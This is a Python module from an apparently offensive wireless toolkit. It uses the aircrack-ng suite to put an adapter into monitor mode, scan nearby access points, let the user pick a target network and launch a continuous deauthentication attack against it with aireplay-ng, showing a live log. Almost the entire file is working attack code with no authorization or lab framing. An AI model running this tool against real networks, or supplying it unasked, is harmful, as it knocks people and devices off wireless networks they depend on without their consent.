import subprocess
import os
import pty
import csv
import time
import shutil
from datetime import datetime

from utils import banner

active_wireless_network = []


def check_for_essid(essid, lst):
    if not essid:
        return False
    if len(lst) == 0:
        return True
    for item in lst:
        if essid in (item["ESSID"] or ""):
            return False
    return True


def backup_stray_csv_files():
    if not any(".csv" in f for f in os.listdir()):
        return
    banner.info("archiving scan .csv files to backup_files/")
    directory = os.getcwd()
    try:
        os.mkdir(directory + "/backup_files")
    except FileExistsError:
        pass
    for file in os.listdir():
        if ".csv" in file:
            timestamp = datetime.now().strftime("%Y%m%d-%H%M%S")
            shutil.move(file, f"{directory}/backup_files/{timestamp}-{file}")


def detect_wireless_interfaces():
    # parse iwconfig's actual per-interface blocks instead of assuming a
    # "wlan0"-style name — udev-assigned names (e.g. wlx00c0ca8a1234 for USB
    # adapters) and non-wireless interfaces listed before it (eth0, lo, ...)
    # would otherwise cause a real adapter to go undetected
    result = subprocess.run(["iwconfig"], capture_output=True, text=True)
    interfaces = []
    for block in result.stdout.split("\n\n"):
        block = block.strip()
        if not block or "no wireless extensions" in block:
            continue
        name = block.splitlines()[0].split()[0]
        interfaces.append(name)
    return interfaces


def select_interface():
    banner.module_banner("wifi")
    banner.section("select a wireless interface", accent=banner.C.CYAN)

    banner.box(
        [
            f"{banner.C.WARN}adapter must support BOTH monitor mode AND packet injection{banner.C.RESET}",
            "many built-in laptop wifi chips support monitor mode but not injection.",
            f"check with: {banner.C.WHITE}aireplay-ng --test <interface>{banner.C.RESET}",
        ],
        title="⚠ hardware requirement",
        accent=banner.C.WARN,
    )

    interfaces = detect_wireless_interfaces()
    if len(interfaces) == 0:
        banner.error("no wireless adapter found, please connect one and try again")
        raise banner.BackToMenu()

    print()
    lines = [f"{banner.C.CYAN}[{index}]{banner.C.RESET} {item}" for index, item in enumerate(interfaces, start=1)]
    lines.append(f"{banner.C.CYAN}[q]{banner.C.RESET} exit")
    banner.box(lines, title="available interfaces", accent=banner.C.CYAN)

    while True:
        choice = banner.prompt("interface", accent=banner.C.CYAN)
        if choice.lower() in ("q", "b"):
            raise banner.BackToMenu()
        try:
            index = int(choice) - 1
            if index < 0:
                raise IndexError
            return interfaces[index]
        except (ValueError, IndexError):
            banner.warn("invalid selection, try again")


def find_monitor_interface(fallback):
    result = subprocess.run(["iwconfig"], capture_output=True, text=True)
    for block in result.stdout.split("\n\n"):
        block = block.strip()
        if "Mode:Monitor" in block:
            return block.splitlines()[0].split()[0]
    return fallback + "mon"


def prepare_monitor_mode(interface):
    banner.module_banner("wifi")
    banner.section("preparing monitor mode", accent=banner.C.CYAN)
    banner.info(f"killing conflicting processes on {interface}...")
    subprocess.run(["sudo", "airmon-ng", "check", "kill"])
    banner.info(f"enabling monitor mode on {interface}...")
    subprocess.run(["sudo", "airmon-ng", "start", interface])
    time.sleep(1)

    mon_interface = find_monitor_interface(interface)
    banner.ok(f"monitor mode ready on {mon_interface}")
    return mon_interface


SCAN_DURATION = 30  # seconds


def _render_scan_screen(elapsed, tick):
    # redraw only the box (via restore_cursor) instead of re-clearing the whole
    # screen and reprinting the big logo/links block on every tick — that full
    # redraw is what made the scan screen feel slow and flickery
    banner.restore_cursor()

    # the bar shrinks to fit whatever's left inside the box after borders/
    # padding, so nothing can ever be wider than the box itself
    bar_width = max(10, min(32, banner.width() - 24))
    spin = banner.spinner_frame(tick, accent=banner.C.CYAN)
    bar = banner.progress_bar(elapsed, SCAN_DURATION, bar_width=bar_width, accent=banner.C.CYAN)
    remaining = max(0, round(SCAN_DURATION - elapsed))

    lines = [
        f"{spin}  {bar}",
        f"{remaining:>2}s left  ·  {len(active_wireless_network)} access point(s) found",
        "",
        f"{'essid':<24}{'bssid':<20}{'speed'}",
        f"{'-----':<24}{'-----':<20}{'-----'}",
    ]
    for item in active_wireless_network:
        speed = (item.get("Speed") or "").strip()
        speed_display = f"{speed}Mb/s" if speed else "-"
        essid = (item["ESSID"] or "").strip()
        if len(essid) > 22:
            essid = essid[:21] + "…"
        lines.append(f"{essid:<24}{item['BSSID']:<20}{speed_display}")
    if not active_wireless_network:
        lines.append(f"{banner.C.MUTED}no access points found yet...{banner.C.RESET}")
    lines.append("")
    lines.append(f"{banner.C.MUTED}press ctrl+c to stop early{banner.C.RESET}")

    banner.box(
        lines,
        title="scanning for access points",
        accent=banner.C.CYAN,
    )


def _render_results_screen():
    banner.restore_cursor()

    lines = [
        f"{'no':<4}{'bssid':<20}{'ch':<5}{'speed':<9}{'essid'}",
        f"{'--':<4}{'-----':<20}{'--':<5}{'-----':<9}{'-----'}",
    ]
    for index, item in enumerate(active_wireless_network):
        speed = (item.get("Speed") or "").strip()
        speed_display = f"{speed}Mb/s" if speed else "-"
        lines.append(f"{index:<4}{item['BSSID']:<20}{item['channel'].strip():<5}{speed_display:<9}{item['ESSID']}")

    if not active_wireless_network:
        lines.append(f"{banner.C.MUTED}no access points found{banner.C.RESET}")

    lines.append("")
    lines.append(f"{banner.C.CYAN}[r]{banner.C.RESET} scan again")
    lines.append(f"{banner.C.CYAN}[q]{banner.C.RESET} exit")

    banner.box(lines, title="access points found", accent=banner.C.CYAN)


def scan_networks(interface):
    fieldnames = ["BSSID", "First_time_seen", "Last_time_seen", "channel", "Speed", "Privacy",
                  "Cipher", "Authentication", "Power", "beacons", "IV", "LAN_IP", "ID_length",
                  "ESSID", "Key"]

    banner.module_banner("wifi")
    banner.section("scanning for access points", accent=banner.C.CYAN)
    banner.save_cursor()

    scan_proc = subprocess.Popen(
        ["sudo", "airodump-ng", "-w", "file", "--write-interval", "1", "--output-format", "csv",
         interface],
        stdout=subprocess.PIPE,
        stderr=subprocess.STDOUT,
        text=True,
    )

    start = time.monotonic()
    tick = 0
    early_exit_output = None

    try:
        while True:
            elapsed = time.monotonic() - start

            for file in os.listdir():
                if ".csv" in file:
                    with open(file) as csv_h:
                        csv_h.seek(0)
                        csv_reader = csv.DictReader(csv_h, fieldnames=fieldnames)
                        for row in csv_reader:
                            if row["BSSID"] in (None, "BSSID"):
                                continue
                            if check_for_essid(row["ESSID"], active_wireless_network):
                                active_wireless_network.append(row)

            _render_scan_screen(elapsed, tick)
            tick += 1

            if elapsed >= SCAN_DURATION:
                break

            # sudo runs airodump-ng in its own pty, so a ctrl+c can stop that
            # child on its own — if it's already gone, stop here too instead
            # of waiting out the rest of the timer for nothing
            if scan_proc.poll() is not None:
                early_exit_output = scan_proc.stdout.read().strip() if scan_proc.stdout else ""
                break

            time.sleep(0.4)
    except KeyboardInterrupt:
        pass
    finally:
        if scan_proc.poll() is None:
            scan_proc.terminate()

    _render_results_screen()
    banner.ok(f"scan complete, found {len(active_wireless_network)} network(s)")

    # print this AFTER the results screen's clear() so it doesn't get wiped
    # before the user has a chance to read why airodump-ng stopped early
    if early_exit_output is not None:
        banner.warn("airodump-ng exited before the scan timer finished")
        if early_exit_output:
            for line in early_exit_output.splitlines()[-5:]:
                banner.error(line)
        else:
            banner.info("(it exited with no output — likely killed by a signal, e.g. an early ctrl+c)")


def select_target(mon_interface):
    while True:
        choice = banner.prompt("target", accent=banner.C.CYAN)
        if choice.lower() in ("q", "b"):
            raise banner.BackToMenu()
        if choice.lower() in ("r", "rescan"):
            active_wireless_network.clear()
            scan_networks(mon_interface)
            continue
        try:
            return active_wireless_network[int(choice)]
        except (ValueError, IndexError):
            banner.warn("invalid selection, try again")


ATTACK_LOG_LINES = 12  # how many recent aireplay-ng lines stay visible in the box


def _render_attack_screen(tick, target, log_lines):
    # redraw only the box (via restore_cursor) instead of re-clearing the whole
    # screen and reprinting the big logo/links block on every new log line
    banner.restore_cursor()

    spin = banner.spinner_frame(tick, accent=banner.C.CYAN)

    lines = [
        f"target essid : {target['ESSID']}",
        f"target bssid : {target['BSSID']}",
        f"channel      : {target['channel'].strip()}",
        "",
        f"{spin}  sending deauth frames...",
        "",
    ]
    if log_lines:
        lines.extend(log_lines)
    else:
        lines.append(f"{banner.C.MUTED}waiting for aireplay-ng output...{banner.C.RESET}")
    lines.append("")
    lines.append(f"{banner.C.MUTED}press ctrl+c to stop{banner.C.RESET}")

    banner.box(lines, title="aireplay-ng log", accent=banner.C.CYAN)


def launch_attack(mon_interface, target):
    banner.module_banner("wifi")
    banner.section("launching deauthentication attack", accent=banner.C.CYAN)
    channel = target["channel"].strip()
    bssid = target["BSSID"]

    print(f"  target essid  : {target['ESSID']}")
    print(f"  target bssid  : {bssid}")
    print(f"  channel       : {channel}")
    banner.countdown(3, "attacking")

    # tune the monitor interface to the target's channel before deauthing,
    # otherwise aireplay-ng listens on whatever channel it was last left on
    # and never sees the target's beacon frames
    subprocess.run(["sudo", "iwconfig", mon_interface, "channel", channel])

    banner.module_banner("wifi")
    banner.section("deauthentication attack running", accent=banner.C.CYAN)
    banner.save_cursor()

    # give aireplay-ng a real pty instead of a plain pipe for its output —
    # a plain pipe makes it detect a non-terminal and switch to full block
    # buffering, which delays the boxed live log by several seconds; a pty
    # keeps it thinking it's talking to a terminal, so it stays line-buffered
    master_fd, slave_fd = pty.openpty()
    attack_proc = subprocess.Popen(
        ["sudo", "aireplay-ng", "--deauth", "0", "-a", bssid, mon_interface],
        stdout=slave_fd,
        stderr=slave_fd,
        close_fds=True,
    )
    os.close(slave_fd)

    log_lines = []
    tick = 0
    buf = ""
    try:
        while True:
            try:
                chunk = os.read(master_fd, 4096)
            except OSError:
                break  # the slave side closed once aireplay-ng exited
            if not chunk:
                break

            buf += chunk.decode("utf-8", errors="replace")
            *complete_lines, buf = buf.replace("\r\n", "\n").replace("\r", "\n").split("\n")
            for line in complete_lines:
                line = line.strip()
                if line:
                    log_lines.append(line)
                    del log_lines[:-ATTACK_LOG_LINES]

            _render_attack_screen(tick, target, log_lines)
            tick += 1
    except KeyboardInterrupt:
        pass
    finally:
        if attack_proc.poll() is None:
            attack_proc.terminate()
        attack_proc.wait()
        os.close(master_fd)

    banner.warn("deauthentication attack stopped")


def run():
    backup_stray_csv_files()
    try:
        interface = select_interface()
        mon_interface = prepare_monitor_mode(interface)
        scan_networks(mon_interface)
        target = select_target(mon_interface)
        launch_attack(mon_interface, target)
    finally:
        # always sweep up this run's airodump-ng .csv files, whether the attack
        # finished, was interrupted, or errored out
        backup_stray_csv_files()


if __name__ == "__main__":
    try:
        run()
    except banner.BackToMenu:
        banner.info("bye.")
    except KeyboardInterrupt:
        print()
        banner.warn("aborted")
